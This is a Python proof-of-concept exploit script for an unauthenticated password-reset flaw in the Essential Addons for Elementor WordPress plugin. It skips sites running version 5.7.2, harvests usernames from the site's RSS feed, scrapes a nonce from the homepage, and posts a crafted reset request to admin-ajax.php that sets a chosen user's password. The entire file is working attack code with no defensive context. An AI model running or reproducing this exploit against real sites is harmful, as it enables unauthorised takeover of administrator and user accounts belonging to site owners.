import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from bs4 import BeautifulSoup

def check_version(wordpress_url):
    url = f"{wordpress_url}/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt"
    response = requests.get(url)
    if "5.7.2" in response.text:
        print("Sorry, unable to do anything.")
        exit()

def extract_usernames(wordpress_url):
    url = f"{wordpress_url}/feed/"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "lxml")
    all_usernames = set()
    for user in soup.find_all("dc:creator"):
        all_usernames.add(user.text)
    return all_usernames

def select_username(usernames):
    print("Please select a username:")
    for i, username in enumerate(usernames):
        print(f"{i+1}. {username}")
    index = int(input("> ")) - 1
    return list(usernames)[index]

def extract_nonce(wordpress_url):
    try:
        url = f"{wordpress_url}/"
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "lxml")
        script_tag = soup.find("script", text=lambda t: "var localize" in str(t))
        script_text = script_tag.text.strip() if script_tag else ""
        nonce_start_index = script_text.find('"nonce":"') + 9
        nonce_end_index = script_text.find('"', nonce_start_index)
        return script_text[nonce_start_index:nonce_end_index]
    except Exception as e:
        print("Sorry, not able to help.")
        exit()

def send_request(wordpress_url, nonce, user, password):
    url = f"{wordpress_url}/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    payload = {
        "action": "login_or_register_user",
        "eael-resetpassword-submit": "true",
        "page_id": "124",
        "widget_id": "224",
        "eael-resetpassword-nonce": nonce,
        "eael-pass1": password,
        "eael-pass2": password,
        "rp_login": f"{user}"
    }

    response = requests.post(url, headers=headers, data=payload, verify=False)

    print(response.text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url", required=True, help="URL of the WordPress site")
    parser.add_argument("-p","--password", required=True, help="Password to set for the selected username")
    args = parser.parse_args()

    check_version(args.url)

    all_usernames = extract_usernames(args.url)
    if not all_usernames:
        print("No usernames found.")
        exit()

    selected_username = select_username(all_usernames)

    nonce = extract_nonce(args.url)
    if not nonce:
        print("Sorry, not able to help.")
        exit()
    print(f"Nonce value: {nonce}")

    send_request(args.url, nonce, selected_username, args.password)
